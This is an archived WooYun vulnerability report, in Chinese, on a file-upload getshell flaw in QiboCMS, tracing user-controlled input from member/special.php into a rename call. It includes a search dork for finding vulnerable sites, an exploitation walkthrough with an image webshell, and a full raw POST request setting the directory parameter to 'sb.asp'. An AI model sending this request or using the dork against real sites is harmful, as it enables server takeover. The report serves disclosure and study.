{"id": 318, "wybug_id": "wooyun-2014-071137", "wybug_title": "qibocms内容管理系统Getshell（有环境限制）", "wybug_corp": "齐博CMS", "wybug_author": "路人甲", "wybug_date": "2014-08-05 19:22", "wybug_open_date": "2014-10-31 19:24", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-10：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-31：\t细节向公众公开  简要描述：  详细说明：  0x01 简介  齐博CMS前身是2003年所创建的PHP168网站管理系统，它是国内主流CMS系统之一，曾多次被新浪网、腾讯网、凤凰网等多家大型IT媒体报道。齐博CMS目前已有数以万计的用户在使用，覆盖政府、 企业、科研教育和媒体等各个领域。  其中通过关键字批量搜索，统计有26w多条记录  inurl:bencandy  遍及大量企业、政府、教育等等单位： \n\n0x02 漏洞分析在member\\special.php中\nif($job=='editsp'||$job=='addsp'){\tif($step==2){\t    //echo 'aaaaa';\t\tif(!$postdb[title]){\t\t\tshowerr(\"名称不能为空\");\t\t}elseif(!$postdb[fid]){\t\t\tshowerr(\"分类不能为空\");\t\t}  ....//省略若干无关代码\t\tif($postdb[picurl]&&!eregi(\"(jpg|gif|png)$\",$postdb[picurl])){\t\t\tshowerr(\"封面只能是JPG,PNG,GIF格式的图片\");\t\t}\t\t\t\t/*缩略图处理*/\t\tif( $postdb[picurl] && !strstr($postdb[picurl],\"http://\") )\t\t{\t\t\t//图片目录转移\t\t\t//echo $lfjdb[uid].'---'.tempdir($postdb[picurl]).'---'.$postdb[fid];exit();\t\t\tmove_attachment($lfjdb[uid],tempdir($postdb[picurl]),\"special/$postdb[fid]\");\n其中看函数move_attachment$lfjdb[uid]为uid，它是不可控的变量。$postdb[picurl] 为提交图片url 其中会经过一系列函数处理，为可控变量。$postdb[fid] 为我们可控变量，其为post提交的值。我们跟踪move_attachment函数在inc/function.inc.php中800行处\nfunction move_attachment($uid,$str,$newdir,$type=''){\tglobal $webdb;\tif(!$str||!$uid||!$newdir){\t\treturn $str;\t}\t//echo 'test';\t$filedb = get_content_attachment($str);\t//var_dump($filedb);exit();\tforeach($filedb AS $value){\t\t$name=basename($value);\t\t$ture_old_path = ROOT_PATH.\"$webdb[updir]/$value\";\t\t$ture_new_path = ROOT_PATH.\"$webdb[updir]/$newdir/$name\";\t\tif(is_file($ture_new_path)||!is_file($ture_old_path)){\t\t\tcontinue;\t\t}\t\t$detail=explode(\"_\",$name);\t\t//获取文件的UID与用户的UID一样时.才删除.不要乱删除\t\tif($detail[0] && $detail[0]==$uid){\t\t\t\t\t\tif(!is_dir(ROOT_PATH.$webdb[updir].\"/\".$newdir)){\t\t\t\t\t\t\tmakepath(ROOT_PATH.$webdb[updir].\"/\".$newdir);\t\t\t}\t\t\t//自动缩小太大张的图片\t\t\tif( $webdb[ArticlePicWidth] && $webdb[ArticlePicHeight] && eregi(\"(gif|png|jpg)$\",$ture_old_path) ){\t\t\t\t$img_array=getimagesize($ture_old_path);\t\t\t\tif($img_array[0]>$webdb[ArticlePicWidth]||$img_array[1]>$webdb[ArticlePicHeight]){\t\t\t\t\tgdpic($ture_old_path,$ture_old_path,$webdb[ArticlePicWidth],$webdb[ArticlePicHeight],1);\t\t\t\t}\t\t\t}\t\t\t//图片加水印\t\t\tif( $type!='small' && $webdb[is_waterimg] && eregi(\"(gif|png|jpg)$\",$ture_old_path) ){\t\t\t\t\t\t\tinclude_once(ROOT_PATH.\"inc/waterimage.php\");\t\t\t\timageWaterMark($ture_old_path,$webdb[waterpos],ROOT_PATH.$webdb[waterimg]);\t\t\t}\t\t\tif( @rename($ture_old_path,$ture_new_path) ){\t\t\t\t\t\t\t$str=str_replace(\"$value\",\"$newdir/$name\",$str);\t\t\t}\t\t}\t}\treturn $str;}\n其中get_content_attachment 函数为统计附件函数，返回该目录下的附件文件名。将变量filedb 进行遍历。在遍历过程中，将旧文件 移往新文件夹。\nforeach($filedb AS $value){\t\t$name=basename($value);\t\t$ture_old_path = ROOT_PATH.\"$webdb[updir]/$value\";\t\t$ture_new_path = ROOT_PATH.\"$webdb[updir]/$newdir/$name\";\n其中$newdir为我们前面可控的变量，顾这个路径为我们所控制。。顾我们可将我们的变量控制位：1.asp在结尾\nif( @rename($ture_old_path,$ture_new_path) ){\t\t\t\t\t\t\t$str=str_replace(\"$value\",\"$newdir/$name\",$str);\t\t\t}\n我们可看到rename这个过程，直接判断之后直接rename了。。。漏洞产生。。。0x03 漏洞利用   1、上次一个图片马。。。   2、将图片马地址记下来 \nPOST /v7/member/special.php?job=editsp HTTP/1.1Host: localhostUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://localhost/v7/member/special.php?job=editspCookie: USR=z89xpd7c%0917%091407136845%09http%3A%2F%2Flocalhost%2Fv7%2Fdo%2Fupfile.php%3Fdir%3Dspecial; passport=2%09test1234%09BQVRUlNRVFJUA1YGAlxQWFUCXVoFAl1SUVcFAAFWBwM%3D62c7013782Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 191postdb%5Btitle%5D=aaaaaaaaaaaa&postdb%5Bfid%5D=sb.asp&postdb%5Bpicurl%5D=special%2F2_20140804150846_eka9t.png&postdb%5Bbanner%5D=&postdb%5Bcontent%5D=aaaaaa&Submit=+%CC%E1+%BD%BB+&step=2&id=0\n其中即可获取一个shell。。。最后文件名不会变。 http://xxxx.com/upload_files/special/sb.asp/2_20140804150846_eka9t.png\n\n   漏洞证明：  \n\n   修复方案：  传进行的参数都要仔细过滤吧，   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-10-31 19:24 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-08-05 20:40 |    \t\tAzui \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:10        | 用一只黑色铅笔画一出舞台默剧。)\t\t \n  姿势    \n     2014-08-05 20:50 |    \t\t小小鸟 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:6        | 小白一个)\t\t \n  @Azui 同求    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}